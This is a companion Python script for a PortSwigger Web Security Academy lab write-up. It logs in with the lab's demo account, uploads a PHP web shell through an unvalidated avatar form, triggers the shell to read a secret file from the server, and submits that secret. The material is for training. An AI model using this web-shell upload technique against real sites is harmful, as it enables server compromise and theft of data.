#!/usr/bin/env python3
"""
Remote code execution via web shell upload
PortSwigger Web Security Academy -- File Upload

Companion script for the writeup: 01-remote-code-execution-via-web-shell-upload.md

What this does:
    Logs in, uploads a plain PHP web shell as exploit.php through the avatar
    form with no bypass of any kind (the endpoint doesn't validate type,
    extension, or content), then fetches it back from /files/avatars/ to
    trigger execution and read Carlos's secret out of the response body.

Usage:
    python 01-remote-code-execution-via-web-shell-upload.py <lab-url>
    e.g. python 01-remote-code-execution-via-web-shell-upload.py https://0a1b00fa03d9c8b6803b56b400eb00d5.web-security-academy.net

Requirements:
    pip install httpx
"""

import re
import sys
import httpx

PHP_SHELL = "<?php echo file_get_contents('/home/carlos/secret'); ?>"


def _get_csrf(client: httpx.Client, url: str) -> str:
    r = client.get(url)
    m = re.search(r'name="csrf"\s+value="([^"]+)"', r.text)
    return m.group(1) if m else ""


def _login(client: httpx.Client, base: str) -> bool:
    csrf = _get_csrf(client, f"{base}/login")
    r = client.post(f"{base}/login", data={
        "csrf": csrf, "username": "wiener", "password": "peter",
    }, follow_redirects=False)
    if r.status_code in (301, 302):
        loc = r.headers.get("location", "/")
        if loc.startswith("/"):
            loc = f"{base}{loc}"
        client.get(loc, follow_redirects=True)
    return "session" in str(client.cookies)


def solve(lab_url: str) -> None:
    client = httpx.Client(follow_redirects=True, verify=False, timeout=15)

    if not _login(client, lab_url):
        print("[-] Login failed")
        return
    print("[+] Logged in as wiener")

    csrf = _get_csrf(client, f"{lab_url}/my-account")
    r = client.post(f"{lab_url}/my-account/avatar",
                    files={"avatar": ("exploit.php", PHP_SHELL.encode(), "application/x-php")},
                    data={"csrf": csrf, "user": "wiener"})
    print(f"[*] Upload response: {r.status_code}")

    file_url = f"{lab_url}/files/avatars/exploit.php"
    fetched = client.get(file_url)
    secret = fetched.text.strip()
    print(f"[*] Fetched {file_url} -- body: {secret[:200]!r}")

    if not secret or "<?php" in secret:
        print("[-] File did not execute -- no secret recovered")
        return

    print(f"[+] Secret: {secret}")
    client.post(f"{lab_url}/submitSolution", data={"answer": secret})

    check = client.get(lab_url)
    if "Congratulations" in check.text:
        print("[+] Lab solved.")
    else:
        print("[-] Not solved yet -- double-check the extracted secret.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
